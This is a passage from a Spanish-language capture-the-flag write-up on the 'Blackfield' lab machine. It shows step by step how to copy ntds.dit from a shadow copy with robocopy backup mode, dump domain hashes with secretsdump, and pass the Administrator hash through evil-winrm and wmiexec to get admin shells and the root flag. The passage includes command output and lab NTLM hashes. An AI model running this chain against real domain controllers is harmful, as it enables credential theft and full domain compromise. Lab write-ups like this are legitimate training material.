                - Creation time: 7/4/2021 7:43:47 PM
                - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {c0923ace-4f7c-4103-b22b-a482d236cf63}
The shadow copy was successfully exposed as z:\\.
->
```

En este punto, tendremos que copiar el archivo **NTDS** y transferirlo desde la unidad lógica al directorio actual de trabajo, si hacemos uso de **COPY** nos va a mostrar error de **acceso denegado** como se muestra a continuación:

```bash
*Evil-WinRM* PS C:\\Windows\\temp> copy Z:\\Windows\\ntds\\ntds.dit .
Access to the path 'Z:\\Windows\\ntds\\ntds.dit' is denied.
At line:1 char:1
+ copy Z:\\Windows\\ntds\\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (Z:\\Windows\\ntds\\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

Este error de acceso no autorizado podemos saltarlo con la herramienta **Robocopy**. Esta herramienta no tiene encuenta los permisos de archivos y/o carpetas (ACL) y esto nos permite copiar archivos a los que de otro modo no tendriamos acceso, suponiendo que lo ejecutemos con una cuenta sin privilegios.

```bash
*Evil-WinRM* PS C:\\windows\\temp> robocopy /b Z:\\Windows\\ntds . ntds.dit                                                                                                                                                                   
                                                                                                                                                                                                                                                             
------------------------------------------------------------------------------- 
   ROBOCOPY     ::     Robust File Copy for Windows                                                                                                                                                                                                          
------------------------------------------------------------------------------- 
                                                                                                                                                                                                                                                             
  Started : Sunday, July 4, 2021 8:16:02 PM                                                                                                                                                                                                                  
   Source : Z:\\Windows\\ntds\\                                                                                                                                                                                                                                 
     Dest : C:\\Users\\svc_backup\\Desktop\\backup\\                                                                                                                                                                                                              
                                                                                                                                                                                                                                                             
    Files : ntds.dit                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                             
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30                                                                                                                                                                                                          
                                                                                                                                                                                                                                                             
------------------------------------------------------------------------------ 
                                                                                                                                                                                                                                                             
                           1    Z:\\Windows\\ntds\\                                                                                                                                                                                                             
            New File              18.0 m        ntds.dit                                                                                                                                                                                                     
 0.0%
 0.3%
 0.6%
 (...)
 99.3%
 99.6%
 100%
 100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :           173159339 Bytes/sec.
   Speed :            9908.256 MegaBytes/min.
   Ended : Sunday, July 4, 2021 8:16:02 PM
```

Descargamos el archivo NTDS.dit a nuestra máquina. Ya tenemos los 2 archivos necesarios (**NTDS y SYSTEM**) para poder extraer los hashes de los usuarios a nivel de dominio:

```bash
# ls -l        
.rw-r--r-- root root   13 MB Mon Jul  5 11:02:24 2021  ntds.dit
.rw-r--r-- root root 16.4 MB Mon Jul  5 10:32:11 2021  system
```

Ahora para poder hacer la extación, haremos uso de la herramienta **Secretsdump** con la siguiente sintaxis:

```bash
# secretsdump.py -system system -ntds ntds.dit LOCAL | tee dump_hashes

# head -n 13 dump_hashes
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:eb83d85fecbf5d3c9307673e87e8e57c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

El hash NTLM que más nos interesa es el de la cuenta de **Administrador**, así que vamos a comprobar como anteriormente con **CrackMapExec** si este es válido:

```bash
# crackmapexec smb 10.129.44.182 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
SMB         10.129.1.243    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.1.243    445    DC01             [+] BLACKFIELD.local\\Administrator 184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Vemos que es válido y la prueba de que tenemos privilegios como administrador nos la indica la bandera **Pwn3d!**

Bueno, en este punto solo nos quedaría realizar **pass the hash** y obtener shell con usuario administrador, para ello tenemos varias formas. A mi me ha dado problemas psexec.py ya que no llegaba a entablar comunicación correctamente, pero mostraré las distintas formas:

- Evil-WinRm
- Wmiexec

**Evil-WinRM:**

```bash
# evil-winrm -i 10.129.44.182 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami
blackfield\\administrator
```

**Wmiexec:**

```bash
# wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.129.44.182

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>whoami
blackfield\\administrator
```

### Root Flag

Una vez finalizado, podemos visualizar la flag de **root.txt** en el directorio **Desktop** del usuario **Administrator**:

```bash
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ../desktop
*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> dir

    Directory: C:\\Users\\Administrator\\desktop

Mode                LastWriteTime         Length Name
---- ------------- ------ ----
-a---- 2/28/2020   4:36 PM            447 notes.txt
-ar--- 7/5/2021   7:52 AM             34 root.txt

*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> type root.txt
7e8936134ebfb9bc36c60e5957f05167
```
